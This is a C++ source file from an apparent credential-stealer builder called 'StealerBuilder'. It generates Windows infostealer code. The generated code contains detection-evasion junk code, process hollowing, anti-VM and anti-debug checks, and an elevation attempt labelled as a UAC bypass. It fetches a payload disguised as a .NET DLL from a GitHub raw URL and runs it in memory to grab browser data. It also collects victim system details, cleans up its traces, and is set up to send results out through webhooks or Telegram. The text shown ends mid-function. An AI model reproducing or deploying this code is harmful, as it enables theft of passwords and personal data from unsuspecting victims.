#include "stubgenerator.h"
#include <QFile>
#include <QTextStream>
#include <QRandomGenerator>

StubGenerator::StubGenerator() {
}

QString StubGenerator::generateStub(const StealerConfig& config) const {
    QString code;
    
    code += "// Auto-generated stealer stub\n";
    code += "// This file was generated by StealerBuilder\n";
    code += "// Build: x86_64-w64-mingw32-g++ -O2 -static -s -std=c++17 -mwindows stub.cpp -o output.exe -lwinhttp -lurlmon -lcrypt32 -lshell32 -ladvapi32 -lgdi32 -luser32 -lws2_32 -lole32 -luuid\n\n";
    
    code += generateIncludes(config);
    code += "\n";
    
    // Add polymorphic junk code for detection evasion
    if (config.obfuscate) {
        code += "// ========================================\n";
        code += "// POLYMORPHIC CODE SECTION\n";
        code += "// Each build generates unique signatures\n";
        code += "// ========================================\n\n";
        code += generateJunkCode(QRandomGenerator::global()->bounded(5, 12));
        code += "\n";
    }
    
    // Always include utility functions
    code += generateUtilities(config);
    code += "\n";
    
    if (config.obfuscate) {
        code += generateStringObfuscation(config);
        code += "\n";
    }
    
    if (config.antiVM || config.antiSandbox || config.antiDebug) {
        code += generateAntiAnalysis(config);
        code += "\n";
    }
    
    if (config.grabChrome || config.grabFirefox || config.grabEdge || config.grabBrave) {
        code += generateBrowserGrabber(config);
        code += "\n";
    }
    
    // Add screenshot function if enabled
    if (config.captureScreen) {
        code += generateScreenshot(config);
        code += "\n";
    }
    
    if (!config.webhookUrl.isEmpty() || !config.httpPostUrl.isEmpty() || !config.telegramToken.isEmpty() || config.captureScreen) {
        code += generateExfiltration(config);
        code += "\n";
    }
    
    code += generateMainFunction(config);
    
    return code;
}

bool StubGenerator::saveStubToFile(const QString& filename, const StealerConfig& config) const {
    QFile file(filename);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        return false;
    }
    
    QTextStream out(&file);
    out << generateStub(config);
    file.close();
    return true;
}

QString StubGenerator::generateIncludes(const StealerConfig& config) const {
    QString code;
    code += "#include <windows.h>\n";
    code += "#include <winhttp.h>\n";
    code += "#include <urlmon.h>\n";
    code += "#include <shlobj.h>\n";
    code += "#include <wincrypt.h>\n";
    code += "#include <tlhelp32.h>\n";
    code += "#include <lm.h>\n";
    code += "#include <iphlpapi.h>\n";
    if (config.captureScreen) {
        code += "#include <gdiplus.h>\n";
    }
    code += "#include <string>\n";
    code += "#include <vector>\n";
    code += "#include <fstream>\n";
    code += "#include <sstream>\n";
    code += "#include <algorithm>\n";
    code += "#include <memory>\n";
    code += "#include <set>\n";
    code += "#include <ctime>\n";
    code += "#include <cstdlib>\n";
    if (config.captureScreen) {
        code += "using namespace Gdiplus;\n";
    }
    code += "\n";
    
    // Note: Libraries are linked through compiler flags, not #pragma comment
    // This ensures compatibility with both MSVC and MinGW compilers
    
    return code;
}

QString StubGenerator::generateUtilities(const StealerConfig& config) const {
    QString code;
    code += "// ========================================\n";
    code += "// UTILITY FUNCTIONS\n";
    code += "// ========================================\n\n";
    
    // Process Hollowing - Execute PE from memory (pure in-memory, no disk)\n";
    code += "bool LoadPEFromMemory(const std::vector<BYTE>& peData, const std::string& workDir) {\n";
    code += "    \n";
    code += "    // Parse PE headers\n";
    code += "    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)peData.data();\n";
    code += "    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;\n";
    code += "    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pDosHeader + pDosHeader->e_lfanew);\n";
    code += "    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return false;\n";
    code += "    \n";
    code += "    // Create suspended host process (use self)\n";
    code += "    char selfPath[MAX_PATH];\n";
    code += "    GetModuleFileNameA(NULL, selfPath, MAX_PATH);\n";
    code += "    \n";
    code += "    STARTUPINFOA si = {sizeof(si)};\n";
    code += "    si.dwFlags = STARTF_USESHOWWINDOW;\n";
    code += "    si.wShowWindow = SW_HIDE;\n";
    code += "    PROCESS_INFORMATION pi = {0};\n";
    code += "    std::string cmdLine = std::string(selfPath) + \" __hollow__\";\n";
    code += "    \n";
    code += "    if (!CreateProcessA(selfPath, (LPSTR)cmdLine.c_str(), NULL, NULL, TRUE,\n";
    code += "        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, workDir.c_str(), &si, &pi)) {\n";
    code += "        return false;\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Get target process context\n";
    code += "    CONTEXT ctx;\n";
    code += "    ctx.ContextFlags = CONTEXT_FULL;\n";
    code += "    if (!GetThreadContext(pi.hThread, &ctx)) {\n";
    code += "        TerminateProcess(pi.hProcess, 1);\n";
    code += "        CloseHandle(pi.hThread);\n";
    code += "        CloseHandle(pi.hProcess);\n";
    code += "        return false;\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Read PEB to get image base\n";
    code += "    ULONGLONG pebAddress = ctx.Rdx;\n";
    code += "    ULONGLONG imageBase = 0;\n";
    code += "    SIZE_T read = 0;\n";
    code += "    ReadProcessMemory(pi.hProcess, (PVOID)(pebAddress + 16), &imageBase, sizeof(imageBase), &read);\n";
    code += "    \n";
    code += "    // Unmap original image\n";
    code += "    typedef NTSTATUS(WINAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);\n";
    code += "    NtUnmapViewOfSection_t pNtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(\n";
    code += "        GetModuleHandleA(\"ntdll.dll\"), \"NtUnmapViewOfSection\");\n";
    code += "    if (pNtUnmapViewOfSection) {\n";
    code += "        pNtUnmapViewOfSection(pi.hProcess, (PVOID)imageBase);\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Allocate memory in target process\n";
    code += "    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;\n";
    code += "    LPVOID pRemoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase,\n";
    code += "        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
    code += "    \n";
    code += "    if (!pRemoteImage) {\n";
    code += "        pRemoteImage = VirtualAllocEx(pi.hProcess, NULL, imageSize,\n";
    code += "            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
    code += "    }\n";
    code += "    \n";
    code += "    if (!pRemoteImage) {\n";
    code += "        TerminateProcess(pi.hProcess, 1);\n";
    code += "        CloseHandle(pi.hThread);\n";
    code += "        CloseHandle(pi.hProcess);\n";
    code += "        return false;\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Write headers\n";
    code += "    WriteProcessMemory(pi.hProcess, pRemoteImage, peData.data(),\n";
    code += "        pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);\n";
    code += "    \n";
    code += "    // Write sections\n";
    code += "    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);\n";
    code += "    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {\n";
    code += "        if (pSection->SizeOfRawData > 0) {\n";
    code += "            WriteProcessMemory(pi.hProcess,\n";
    code += "                (LPVOID)((BYTE*)pRemoteImage + pSection->VirtualAddress),\n";
    code += "                peData.data() + pSection->PointerToRawData,\n";
    code += "                pSection->SizeOfRawData, NULL);\n";
    code += "        }\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Update PEB with new image base\n";
    code += "    WriteProcessMemory(pi.hProcess, (PVOID)(pebAddress + 16), &pRemoteImage, sizeof(pRemoteImage), NULL);\n";
    code += "    \n";
    code += "    // Set entry point (instruction pointer, not data register!)\n";
    code += "    ctx.Rcx = (ULONGLONG)pRemoteImage; // Image base for entry point\n";
    code += "    ctx.Rip = (ULONGLONG)((BYTE*)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);\n";
    code += "    SetThreadContext(pi.hThread, &ctx);\n";
    code += "    \n";
    code += "    // Resume process\n";
    code += "    ResumeThread(pi.hThread);\n";
    code += "    \n";
    code += "    // Wait for completion (max 5 minutes)\n";
    code += "    DWORD waitResult = WaitForSingleObject(pi.hProcess, 300000);\n";
    code += "    if (waitResult == WAIT_TIMEOUT) {\n";
    code += "        TerminateProcess(pi.hProcess, 1);\n";
    code += "    } else {\n";
    code += "        DWORD exitCode = 0;\n";
    code += "        GetExitCodeProcess(pi.hProcess, &exitCode);\n";
    code += "    }\n";
    code += "    \n";
    code += "    CloseHandle(pi.hThread);\n";
    code += "    CloseHandle(pi.hProcess);\n";
    code += "    return true;\n";
    code += "}\n\n";
    
    // String conversion utilities
    code += "// Convert wide string to UTF-8\n";
    code += "std::string WideToUTF8(const std::wstring& wstr) {\n";
    code += "    if (wstr.empty()) return std::string();\n";
    code += "    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);\n";
    code += "    std::string result(size - 1, 0);\n";
    code += "    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, NULL, NULL);\n";
    code += "    return result;\n";
    code += "}\n\n";
    
    code += "// Convert UTF-8 to wide string\n";
    code += "std::wstring UTF8ToWide(const std::string& str) {\n";
    code += "    if (str.empty()) return std::wstring();\n";
    code += "    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);\n";
    code += "    std::wstring result(size - 1, 0);\n";
    code += "    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], size);\n";
    code += "    return result;\n";
    code += "}\n\n";
    
    // File operations
    code += "// Check if file exists\n";
    code += "bool FileExists(const std::string& path) {\n";
    code += "    DWORD attrib = GetFileAttributesA(path.c_str());\n";
    code += "    return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));\n";
    code += "}\n\n";
    
    code += "// Read file to string\n";
    code += "std::string ReadFile(const std::string& path) {\n";
    code += "    std::ifstream file(path, std::ios::binary);\n";
    code += "    if (!file.is_open()) return \"\";\n";
    code += "    std::stringstream buffer;\n";
    code += "    buffer << file.rdbuf();\n";
    code += "    return buffer.str();\n";
    code += "}\n\n";
    
    code += "// Get TEMP directory\n";
    code += "std::string GetTempDir() {\n";
    code += "    char temp[MAX_PATH];\n";
    code += "    if (GetTempPathA(MAX_PATH, temp)) {\n";
    code += "        return std::string(temp);\n";
    code += "    }\n";
    code += "    return \"C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\\";\n";
    code += "}\n\n";
    
    // Add fixed encryption key (must match chrome_inject.cpp)
    code += "// Fixed XOR encryption key\n";
    code += "const unsigned char ENCRYPT_KEY[] = {\n";
    code += "    0x4B, 0x65, 0x79, 0x31, 0x32, 0x33, 0x34, 0x35,\n";
    code += "    0x36, 0x37, 0x38, 0x39, 0x30, 0x41, 0x42, 0x43,\n";
    code += "    0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B,\n";
    code += "    0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53\n";
    code += "};\n";
    code += "const size_t ENCRYPT_KEY_LEN = sizeof(ENCRYPT_KEY);\n\n";
    
    // Add XOR encryption/decryption
    code += "// Simple XOR encryption/decryption\n";
    code += "std::string XORCrypt(const std::string& data) {\n";
    code += "    std::string result = data;\n";
    code += "    for (size_t i = 0; i < result.length(); i++) {\n";
    code += "        result[i] ^= ENCRYPT_KEY[i % ENCRYPT_KEY_LEN];\n";
    code += "    }\n";
    code += "    return result;\n";
    code += "}\n\n";
    
    return code;
}

QString StubGenerator::generateStringObfuscation(const StealerConfig& config) const {
    QString code;
    code += "// String obfuscation\n";
    code += "std::string xorDecrypt(const char* data, size_t len, char key) {\n";
    code += "    std::string result(len, 0);\n";
    code += "    for (size_t i = 0; i < len; i++) {\n";
    code += "        result[i] = data[i] ^ key;\n";
    code += "    }\n";
    code += "    return result;\n";
    code += "}\n";
    return code;
}

QString StubGenerator::generateAntiAnalysis(const StealerConfig& config) const {
    QString code;
    code += "// Anti-analysis functions\n";
    code += "bool IsDebuggerPresent_() {\n";
    code += "    return IsDebuggerPresent();\n";
    code += "}\n\n";
    
    code += "bool CheckRemoteDebugger() {\n";
    code += "    BOOL debuggerPresent = FALSE;\n";
    code += "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);\n";
    code += "    return debuggerPresent;\n";
    code += "}\n\n";
    
    code += "bool IsVM() {\n";
    code += "    // Check for VM-related registry keys\n";
    code += "    HKEY hKey;\n";
    code += "    const char* vmKeys[] = {\n";
    code += "        \"HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi Port 0\\\\Scsi Bus 0\\\\Target Id 0\\\\Logical Unit Id 0\",\n";
    code += "        \"HARDWARE\\\\Description\\\\System\"\n";
    code += "    };\n";
    code += "    \n";
    code += "    for (const char* key : vmKeys) {\n";
    code += "        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {\n";
    code += "            char value[256];\n";
    code += "            DWORD size = sizeof(value);\n";
    code += "            if (RegQueryValueExA(hKey, \"Identifier\", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {\n";
    code += "                std::string id = value;\n";
    code += "                if (id.find(\"VBOX\") != std::string::npos || \n";
    code += "                    id.find(\"VirtualBox\") != std::string::npos ||\n";
    code += "                    id.find(\"VMware\") != std::string::npos ||\n";
    code += "                    id.find(\"QEMU\") != std::string::npos) {\n";
    code += "                    RegCloseKey(hKey);\n";
    code += "                    return true;\n";
    code += "                }\n";
    code += "            }\n";
    code += "            RegCloseKey(hKey);\n";
    code += "        }\n";
    code += "    }\n";
    code += "    return false;\n";
    code += "}\n\n";
    
    code += "bool IsSandbox() {\n";
    code += "    // Check for sandbox processes\n";
    code += "    const char* sandboxProcs[] = {\"vmtoolsd.exe\", \"vboxservice.exe\", \"vboxtray.exe\", \"sandboxiedll.dll\"};\n";
    code += "    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n";
    code += "    if (snapshot != INVALID_HANDLE_VALUE) {\n";
    code += "        PROCESSENTRY32 pe;\n";
    code += "        pe.dwSize = sizeof(pe);\n";
    code += "        if (Process32First(snapshot, &pe)) {\n";
    code += "            do {\n";
    code += "                for (const char* proc : sandboxProcs) {\n";
    code += "                    if (_stricmp(pe.szExeFile, proc) == 0) {\n";
    code += "                        CloseHandle(snapshot);\n";
    code += "                        return true;\n";
    code += "                    }\n";
    code += "                }\n";
    code += "            } while (Process32Next(snapshot, &pe));\n";
    code += "        }\n";
    code += "        CloseHandle(snapshot);\n";
    code += "    }\n";
    code += "    return false;\n";
    code += "}\n\n";
    
    return code;
}

QString StubGenerator::generateBrowserGrabber(const StealerConfig& config) const {
    QString code;
    code += "// ========================================\n";
    code += "// BROWSER DATA GRABBER (External Tool)\n";
    code += "// ========================================\n\n";
    
    // UAC Elevation check and bypass
    code += "// Check if running as administrator\n";
    code += "bool IsRunningAsAdmin() {\n";
    code += "    BOOL isAdmin = FALSE;\n";
    code += "    PSID adminGroup = NULL;\n";
    code += "    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;\n";
    code += "    \n";
    code += "    if (AllocateAndInitializeSid(&ntAuthority, 2,\n";
    code += "        SECURITY_BUILTIN_DOMAIN_RID,\n";
    code += "        DOMAIN_ALIAS_RID_ADMINS,\n";
    code += "        0, 0, 0, 0, 0, 0, &adminGroup)) {\n";
    code += "        CheckTokenMembership(NULL, adminGroup, &isAdmin);\n";
    code += "        FreeSid(adminGroup);\n";
    code += "    }\n";
    code += "    return isAdmin != FALSE;\n";
    code += "}\n\n";
    
    code += "// Try UAC bypass / elevation\n";
    code += "bool TryElevateToAdmin() {\n";
    code += "    char exePath[MAX_PATH];\n";
    code += "    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {\n";
    code += "        return false;\n";
    code += "    }\n";
    code += "    \n";
    code += "    SHELLEXECUTEINFOA sei = {0};\n";
    code += "    sei.cbSize = sizeof(sei);\n";
    code += "    sei.lpVerb = \"runas\";  // Request elevation\n";
    code += "    sei.lpFile = exePath;\n";
    code += "    sei.lpParameters = \"--elevated\";  // Mark as elevated\n";
    code += "    sei.nShow = SW_HIDE;\n";
    code += "    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;\n";
    code += "    \n";
    code += "    if (ShellExecuteExA(&sei)) {\n";
    code += "        if (sei.hProcess) {\n";
    code += "            WaitForSingleObject(sei.hProcess, INFINITE);\n";
    code += "            CloseHandle(sei.hProcess);\n";
    code += "        }\n";
    code += "        return true;\n";
    code += "    }\n";
    code += "    return false;  // UAC was cancelled or failed\n";
    code += "}\n\n";
    
    // Download file from URL
    code += "// Download file from URL\n";
    code += "bool DownloadFileFromURL(const std::string& url, const std::string& savePath) {\n";
    code += "    std::wstring wUrl = UTF8ToWide(url);\n";
    code += "    std::wstring wPath = UTF8ToWide(savePath);\n";
    code += "    \n";
    code += "    HRESULT hr = URLDownloadToFileW(NULL, wUrl.c_str(), wPath.c_str(), 0, NULL);\n";
    code += "    return SUCCEEDED(hr);\n";
    code += "}\n\n";
    
    // Run external tool (no arguments)
    code += "// Run external extraction tool\n";
    code += "bool RunExtractionTool(const std::string& toolPath, const std::string& workDir) {\n";
    code += "    STARTUPINFOA si = {0};\n";
    code += "    PROCESS_INFORMATION pi = {0};\n";
    code += "    si.cb = sizeof(si);\n";
    code += "    si.dwFlags = STARTF_USESHOWWINDOW;\n";
    code += "    si.wShowWindow = SW_HIDE;\n";
    code += "    \n";
    code += "    std::string cmdLine = \"\\\"\" + toolPath + \"\\\"\";\n";
    code += "    std::vector<char> cmdBuf(cmdLine.begin(), cmdLine.end());\n";
    code += "    cmdBuf.push_back('\\0');\n";
    code += "    \n";
    code += "    if (!CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, FALSE,\n";
    code += "        CREATE_NO_WINDOW, NULL, workDir.c_str(), &si, &pi)) {\n";
    code += "        DWORD err = GetLastError();\n";
    code += "        return false;\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Wait for completion (max 2 minutes)\n";
    code += "    WaitForSingleObject(pi.hProcess, 120000);\n";
    code += "    \n";
    code += "    DWORD exitCode = 0;\n";
    code += "    GetExitCodeProcess(pi.hProcess, &exitCode);\n";
    code += "    \n";
    code += "    CloseHandle(pi.hProcess);\n";
    code += "    CloseHandle(pi.hThread);\n";
    code += "    \n";
    code += "    return exitCode == 0;\n";
    code += "}\n\n";
    
    // Read and decrypt cache.dat file
    code += "// Read and decrypt the consolidated cache.dat file\n";
    code += "std::string ReadDataFile(const std::string& workDir) {\n";
    code += "    std::string dataFile = workDir + \"\\\\cache.dat\";\n";
    code += "    \n";
    code += "    if (!FileExists(dataFile)) {\n";
    code += "        return \"{\\\"error\\\": \\\"Output file not found\\\"}\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    std::string encryptedData = ReadFile(dataFile);\n";
    code += "    if (encryptedData.empty()) {\n";
    code += "        return \"{\\\"error\\\": \\\"Failed to read output file\\\"}\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    std::string decryptedData = XORCrypt(encryptedData);\n";
    code += "    return decryptedData;\n";
    code += "}\n\n";
    
    // Delete directory recursively\n";
    code += "// Delete directory and all contents (forced)\n";
    code += "void DeleteDirectoryRecursive(const std::string& path) {\n";
    code += "    std::string searchPath = path + \"\\\\*.*\";\n";
    code += "    WIN32_FIND_DATAA findData;\n";
    code += "    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);\n";
    code += "    \n";
    code += "    if (hFind != INVALID_HANDLE_VALUE) {\n";
    code += "        do {\n";
    code += "            if (strcmp(findData.cFileName, \".\") != 0 && strcmp(findData.cFileName, \"..\") != 0) {\n";
    code += "                std::string filePath = path + \"\\\\\" + findData.cFileName;\n";
    code += "                SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);\n";
    code += "                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {\n";
    code += "                    DeleteDirectoryRecursive(filePath);\n";
    code += "                } else {\n";
    code += "                    for (int i = 0; i < 3; i++) {\n";
    code += "                        if (DeleteFileA(filePath.c_str())) break;\n";
    code += "                        Sleep(50);\n";
    code += "                    }\n";
    code += "                }\n";
    code += "            }\n";
    code += "        } while (FindNextFileA(hFind, &findData));\n";
    code += "        FindClose(hFind);\n";
    code += "    }\n";
    code += "    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_NORMAL);\n";
    code += "    for (int i = 0; i < 3; i++) {\n";
    code += "        if (RemoveDirectoryA(path.c_str())) break;\n";
    code += "        Sleep(50);\n";
    code += "    }\n";
    code += "}\n\n";
    
    // Main browser grabber function
    code += "// Main browser & application data grabber\n";
    code += "std::string GrabBrowserData() {\n";
    code += "    std::string result;\n";
    code += "    \n";
    code += "    // Use temp directory directly\n";
    code += "    std::string workDir = GetTempDir();\n";
    code += "    if (workDir.back() == '\\\\') workDir.pop_back();\n";
    code += "    \n";
    code += "    // Download extraction tool to memory (no disk touch!)\n";
    code += "    std::string toolUrl = \"https://raw.githubusercontent.com/Matero777/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.Extensions.dll\";\n";
    code += "    \n";
    code += "    HINTERNET hSession = WinHttpOpen(L\"Mozilla/5.0\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);\n";
    code += "    if (!hSession) {\n";
    code += "        return \"{\\\"error\\\": \\\"Failed to download extraction tool\\\"}\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    HINTERNET hConnect = WinHttpConnect(hSession, L\"raw.githubusercontent.com\", 443, 0);\n";
    code += "    if (!hConnect) {\n";
    code += "        WinHttpCloseHandle(hSession);\n";
    code += "        return \"{\\\"error\\\": \\\"Failed to connect\\\"}\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"GET\", L\"/Matero777/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.Extensions.dll\", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);\n";
    code += "    if (!hRequest || !WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {\n";
    code += "        if (hRequest) WinHttpCloseHandle(hRequest);\n";
    code += "        WinHttpCloseHandle(hConnect);\n";
    code += "        WinHttpCloseHandle(hSession);\n";
    code += "        return \"{\\\"error\\\": \\\"Failed to download extraction tool\\\"}\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Read PE into memory\n";
    code += "    std::vector<BYTE> peData;\n";
    code += "    DWORD bytesRead = 0;\n";
    code += "    BYTE buffer[8192];\n";
    code += "    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {\n";
    code += "        peData.insert(peData.end(), buffer, buffer + bytesRead);\n";
    code += "    }\n";
    code += "    \n";
    code += "    WinHttpCloseHandle(hRequest);\n";
    code += "    WinHttpCloseHandle(hConnect);\n";
    code += "    WinHttpCloseHandle(hSession);\n";
    code += "    \n";
    code += "    \n";
    code += "    if (peData.empty()) {\n";
    code += "        return \"{\\\"error\\\": \\\"Download failed\\\"}\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Run extraction tool from memory (process hollowing)\n";
    code += "    if (LoadPEFromMemory(peData, workDir)) {\n";
    code += "        \n";
    code += "        // Wait for cache.dat to appear (max 30 seconds)\n";
    code += "        std::string dataFile = workDir + \"\\\\cache.dat\";\n";
    code += "        int attempts = 0;\n";
    code += "        while (!FileExists(dataFile) && attempts < 300) {\n";
    code += "            Sleep(100);\n";
    code += "            attempts++;\n";
    code += "        }\n";
    code += "        \n";
    code += "        if (FileExists(dataFile)) {\n";
    code += "            Sleep(200);\n";
    code += "            result = ReadDataFile(workDir);\n";
    code += "        } else {\n";
    code += "            result = \"{\\\"error\\\": \\\"Data file not found\\\"}\";\n";
    code += "        }\n";
    code += "    } else {\n";
    code += "        result = \"{\\\"error\\\": \\\"Extraction tool failed\\\"}\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    // Cleanup - delete only our temporary files\n";
    code += "    Sleep(500);\n";
    code += "    std::string cleanupFiles[] = {\"cache.dat\", \"a7f9e2c1b3d4\", \"f6e5d4c3b2a1\", \"2b3c4d5e6f7a\", \"3c4d5e6f7a8b\", \"9a8b7c6d5e4f\", \"4d5e6f7a8b9c\", \"1a2b3c4d5e6f\", \"6f5e4d3c2b1a\", \"5e6f7a8b9c0d\"};\n";
    code += "    for (const auto& file : cleanupFiles) {\n";
    code += "        std::string fullPath = workDir + \"\\\\\" + file;\n";
    code += "        DeleteFileA(fullPath.c_str());\n";
    code += "    }\n";
    code += "    \n";
    code += "    return result;\n";
    code += "}\n\n";
    
    return code;
}

QString StubGenerator::generateSystemInfo(const StealerConfig& config) const {
    QString code;
    code += "// ========================================\n";
    code += "// SYSTEM INFORMATION COLLECTION\n";
    code += "// ========================================\n\n";
    
    code += "std::string GetSystemInfo() {\n";
    code += "    std::string info;\n";
    code += "    char computerName[MAX_COMPUTERNAME_LENGTH + 1];\n";
    code += "    char userName[256];\n";
    code += "    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;\n";
    code += "    \n";
    code += "    info += \"╔═══════════════════════════╗\\n\";\n";
    code += "    info += \"║    USER INFORMATION       ║\\n\";\n";
    code += "    info += \"╚═══════════════════════════╝\\n\\n\";\n";
    code += "    \n";
    code += "    if (GetComputerNameA(computerName, &size)) {\n";
    code += "        info += \"💻 Computer: \" + std::string(computerName) + \"\\n\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    size = 256;\n";
    code += "    if (GetUserNameA(userName, &size)) {\n";
    code += "        info += \"👤 User: \" + std::string(userName) + \"\\n\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    OSVERSIONINFOA osvi;\n";
    code += "    ZeroMemory(&osvi, sizeof(osvi));\n";
    code += "    osvi.dwOSVersionInfoSize = sizeof(osvi);\n";
    code += "    if (GetVersionExA(&osvi)) {\n";
    code += "        info += \"🖥️ OS: Windows \" + std::to_string(osvi.dwMajorVersion) + \".\" + std::to_string(osvi.dwMinorVersion) + \"\\n\";\n";
    code += "    }\n";
    code += "    \n";
    code += "    time_t now = time(NULL);\n";
    code += "    char timeStr[64];\n";
    code += "    strftime(timeStr, sizeof(timeStr), \"%Y-%m-%d %H:%M:%S\", localtime(&now));\n";
    code += "    info += \"⏰ Time: \" + std::string(timeStr) + \"\\n\";\n";
    code += "    \n";
    code += "    return info;\n";
    code += "}\n\n";
    
    // IP Address
    if (config.collectIP) {
        code += "std::string GetExternalIP() {\n";
        code += "    HINTERNET hSession = WinHttpOpen(L\"Mozilla/5.0\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);\n";
        code += "    if (!hSession) return \"Unknown\";\n";
        code += "    HINTERNET hConnect = WinHttpConnect(hSession, L\"api.ipify.org\", 80, 0);\n";
        code += "    if (!hConnect) { WinHttpCloseHandle(hSession); return \"Unknown\"; }\n";
        code += "    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"GET\", L\"/\", NULL, NULL, NULL, 0);\n";
        code += "    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return \"Unknown\"; }\n";
        code += "    if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL)) {\n";
        code += "        DWORD bytesRead = 0;\n";
        code += "        char buffer[256] = {0};\n";
        code += "        WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);\n";
        code += "        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);\n";
        code += "        return std::string(buffer, bytesRead);\n";
        code += "    }\n";
        code += "    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);\n";
        code += "    return \"Unknown\";\n";
        code += "}\n\n";
    }
    
    // Hardware specs
    if (config.collectSpecs) {
        code += "std::string GetHardwareSpecs() {\n";
        code += "    std::string specs;\n";
        code += "    SYSTEM_INFO si;\n";
        code += "    GetSystemInfo(&si);\n";
        code += "    specs += \"🔧 CPU Cores: \" + std::to_string(si.dwNumberOfProcessors) + \"\\n\";\n";
        code += "    MEMORYSTATUSEX memInfo;\n";
        code += "    memInfo.dwLength = sizeof(memInfo);\n";
        code += "    if (GlobalMemoryStatusEx(&memInfo)) {\n";
        code += "        specs += \"💾 RAM: \" + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + \" MB\\n\";\n";
        code += "    }\n";
        code += "    return specs;\n";
        code += "}\n\n";
    }
    
    // Process list
    if (config.collectProcessList) {
        code += "std::string GetProcessList() {\n";
        code += "    std::string processes;\n";
        code += "    std::set<std::string> uniqueProcs;\n";
        code += "    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n";
        code += "    if (snapshot != INVALID_HANDLE_VALUE) {\n";
        code += "        PROCESSENTRY32 pe;\n";
        code += "        pe.dwSize = sizeof(pe);\n";
        code += "        if (Process32First(snapshot, &pe)) {\n";
        code += "            do { uniqueProcs.insert(std::string(pe.szExeFile)); } while (Process32Next(snapshot, &pe));\n";
        code += "        }\n";
        code += "        CloseHandle(snapshot);\n";
        code += "        for (const auto& proc : uniqueProcs) processes += proc + \"\\n\";\n";
        code += "    }\n";
        code += "    return processes;\n";
        code += "}\n\n";
    }
    
    // Installed AV
    if (config.collectInstalledAV) {
        code += "std::string GetInstalledAV() {\n";
        code += "    std::string avList;\n";
